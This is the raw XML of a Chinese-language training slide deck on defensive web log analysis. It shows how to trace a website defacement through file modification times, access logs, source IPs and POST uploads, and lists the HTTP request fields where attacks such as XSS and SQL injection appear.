            <a:ext cx="5892800" cy="456692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2063750" y="1485268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buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>如下图所示，网站页面被篡改</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" alt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分析思路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600" dirty="0"/>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>、根据最常见的情况，服务器被篡改，找到篡改的文件后，确定文件被修改时间，如果是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>页面文件，则可根据</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>修改时间点</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>以及</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>文件名</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>，搜索指定日志文件，找到访问记录。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1028" name="Picture 4" descr="e.) Default.html &#10;zyjs .html &#10;x xnl. tm &#10;defaulta.html &#10;2019/10/28 &#10;2019/6/15 14:10:45 &#10;2019/5/6 &#10;2018/12/17 1348:11 &#10;109 &#10;3 &#10;14 &#10;106 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3" y="2373622"/>
            <a:ext cx="8125037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838200" y="4077075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3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>、根据访问记录，我们可以</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>定位源</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>（当然，这种情况是服务器前端</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>没过云</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>或</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CDN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>，否则源</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>非真实</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>），最好是第一次访问</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>webshell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>或者</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>黑链</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>的源</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>和它的时间点，该</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>可靠度最高（因为攻击者上传</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1"/>
              <a:t>webshell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>或者挂黑链后，很可能会访问一次该文件判断是否写入成功），如果无法定位源</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>，则检查访问路径是否为敏感路径（如后台）。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9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86" y="5099357"/>
            <a:ext cx="10883028" cy="252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分析思路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600"/>
              <a:t>4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>、根据源</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>或敏感路径，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>过滤出相应访问日志</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>，根据过滤后的日志，尝试分析整个攻击过程的操作，看是否有可疑漏洞触发点访问。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2051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17254"/>
            <a:ext cx="10415010" cy="3994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分析思路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263653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600" dirty="0"/>
              <a:t>当无法根据以上定位时，可以多关注事件发生</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>附近时间点的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>POST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>请求</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>，无论是上传</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>webshell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>还是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>黑链</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>，绝大部分情况都是使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>POST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>上传，可关注里面可疑路径的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>POST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>提交，比如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1"/>
              <a:t>upload.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>等。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0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981200" y="2042939"/>
            <a:ext cx="7724775" cy="45259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352550"/>
            <a:ext cx="5715000" cy="5505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58" name="文本框 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2259385" y="1981203"/>
            <a:ext cx="311150" cy="3128645"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="51435" tIns="25717" rIns="51435" bIns="25717" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="4000" b="1">
                <a:solidFill>
                  <a:srgbClr val="1B4F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4000" b="1">
              <a:solidFill>
                <a:srgbClr val="1B4F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4000" b="1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4000" b="1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000" b="1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000" b="1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59" name="TextBox 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2259385" y="1423991"/>
            <a:ext cx="1943100" cy="2512695"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="51435" tIns="25717" rIns="51435" bIns="25717" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="1B4F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en-US" altLang="zh-CN" sz="3200" b="1">
              <a:solidFill>
                <a:srgbClr val="1B4F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200" b="1">
              <a:solidFill>
                <a:srgbClr val="1B4F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200" b="1">
              <a:solidFill>
                <a:srgbClr val="1B4F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200" b="1">
              <a:solidFill>
                <a:srgbClr val="1B4F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200" b="1">
              <a:solidFill>
                <a:srgbClr val="1B4F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61" name="文本框 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2702300" y="2740025"/>
            <a:ext cx="4041775" cy="358140"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="51435" tIns="25717" rIns="51435" bIns="25717" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="200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如何分析日志</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="200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sz="2000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2273300" y="1052513"/>
            <a:ext cx="8064500" cy="0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15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2702300" y="3333115"/>
            <a:ext cx="4041775" cy="358140"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="51435" tIns="25717" rIns="51435" bIns="25717" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="200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小练习</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000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15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2696885" y="1994800"/>
            <a:ext cx="4041775" cy="604520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="51435" tIns="25717" rIns="51435" bIns="25717" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" b="1">
                <a:gradFill>
                  <a:gsLst>
                    <a:gs pos="0">
                      <a:srgbClr val="6FBA2C"/>
                    </a:gs>
                    <a:gs pos="100000">
                      <a:srgbClr val="00479D"/>
                    </a:gs>
                  </a:gsLst>
                  <a:lin ang="36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/>
              </a:rPr>
              <a:t>日志分析目的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="200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sz="2000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日志分析目的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内容占位符 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2097543" y="1060336"/>
            <a:ext cx="8229600" cy="45275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sz="1600" b="1" dirty="0">
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:cs typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
              </a:rPr>
              <a:t>日志分析的目的</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0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ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:cs typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
              </a:rPr>
              <a:t>误报：不是攻击而上报成攻击</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0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ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:cs typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
              </a:rPr>
              <a:t>漏报：是攻击而没有防御的情况</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0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ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:cs typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
              </a:rPr>
              <a:t>日志分析可以</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:cs typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
              </a:rPr>
              <a:t>判断是否误判或者漏判</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:cs typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
              </a:rPr>
              <a:t>，可以</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:cs typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
              </a:rPr>
              <a:t>溯源攻击行为</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0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ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:cs typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
              </a:rPr>
              <a:t>在护网作为防守方必备的技能（分析</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:cs typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
              </a:rPr>
              <a:t>NGAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:cs typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
              </a:rPr>
              <a:t>和态势感知，发现异常）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0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endParaRPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0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endParaRPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0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endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" dirty="0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None/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"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740851" y="3533775"/>
            <a:ext cx="10710297" cy="282087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352550"/>
            <a:ext cx="5715000" cy="5505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58" name="文本框 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2259385" y="1981203"/>
            <a:ext cx="311150" cy="3128645"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="51435" tIns="25717" rIns="51435" bIns="25717" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="40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40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40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4000" b="1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000" b="1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000" b="1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59" name="TextBox 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2259385" y="1513523"/>
            <a:ext cx="1943100" cy="1527810"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="51435" tIns="25717" rIns="51435" bIns="25717" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="1B4F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200" b="1">
              <a:solidFill>
                <a:srgbClr val="1B4F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200" b="1">
              <a:solidFill>
                <a:srgbClr val="1B4F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200" b="1">
              <a:solidFill>
                <a:srgbClr val="1B4F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61" name="文本框 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2695143" y="2628828"/>
            <a:ext cx="4041775" cy="604520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="51435" tIns="25717" rIns="51435" bIns="25717" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" b="1">
                <a:gradFill>
                  <a:gsLst>
                    <a:gs pos="0">
                      <a:srgbClr val="6FBA2C"/>
                    </a:gs>
                    <a:gs pos="100000">
                      <a:srgbClr val="00479D"/>
                    </a:gs>
                  </a:gsLst>
                  <a:lin ang="36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/>
              </a:rPr>
              <a:t>如何分析日志</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="200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sz="2000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2273300" y="1052513"/>
            <a:ext cx="8064500" cy="0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15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2702300" y="3333115"/>
            <a:ext cx="4041775" cy="358140"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="51435" tIns="25717" rIns="51435" bIns="25717" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="200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小练习</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000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15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2702300" y="2098675"/>
            <a:ext cx="4041775" cy="358140"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="51435" tIns="25717" rIns="51435" bIns="25717" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="200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日志分析目的</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000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攻击出现的位置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474" y="1544320"/>
            <a:ext cx="805053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攻击出现的位置</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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Get、post 请求报文的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url字段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Get 、post请求报文的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cookie字段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Get、post请求报文的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referer字段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Post请求报文的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表单字段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Get 、post请求报文的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user-agent字段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Http应答页面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endParaRPr lang="zh-CN" altLang="en-US" sz="1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259" y="1657201"/>
            <a:ext cx="7175834" cy="4170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攻击出现的位置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228728"/>
            <a:ext cx="8050530" cy="424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600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2123440" y="1128395"/>
            <a:ext cx="8229600" cy="66167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sz="1600" b="1">
                <a:latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
              </a:rPr>
              <a:t>Get 请求 URL参数中</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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algn="l">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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algn="l">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="对象 3"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1609407" y="1583055"/>
          <a:ext cx="8973185" cy="5069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" r:id="rId1" imgW="6743700" imgH="3790950" progId="Paint.Picture">
                  <p:embed/>
                </p:oleObj>
              </mc:Choice>
              <mc:Fallback>
                <p:oleObj name="" r:id="rId1" imgW="6743700" imgH="3790950" progId="Paint.Picture">
                  <p:embed/>
                  <p:pic>
                    <p:nvPicPr>
                      <p:cNvPr id="0" name="对象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09407" y="1583055"/>
                        <a:ext cx="8973185" cy="50692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攻击出现的位置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294" name="内容占位符 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2177415" y="1326515"/>
            <a:ext cx="8712200" cy="61976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sz="1600" b="1">
                <a:latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
              </a:rPr>
              <a:t>Post表单字段</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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</p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="12295" name="对象 12294"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="2177418" y="1825625"/>
          <a:ext cx="7461885" cy="345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" r:id="rId1" imgW="7048500" imgH="2886075" progId="Paint.Picture">
                  <p:embed/>
                </p:oleObj>
              </mc:Choice>
              <mc:Fallback>
                <p:oleObj name="" r:id="rId1" imgW="7048500" imgH="2886075" progId="Paint.Picture">
                  <p:embed/>
                  <p:pic>
                    <p:nvPicPr>
                      <p:cNvPr id="0" name="对象 122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77418" y="1825625"/>
                        <a:ext cx="7461885" cy="345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攻击出现的位置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228725"/>
            <a:ext cx="805053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Get 、post请求 URL参数涉及到的攻击</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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xss攻击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SQL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注入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命令执行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文件包含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目录穿越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webshell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信息泄露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网站扫描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 lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pP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cookie字段、referer字段、post表单字段和url请求类似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endParaRPr lang="zh-CN" alt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攻击出现的位置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3"/>
            <a:ext cx="8050530" cy="7934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User-agent  字段或者类似表示</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="accent1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访问客户端软件</a:t>
            </a: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的字段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endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
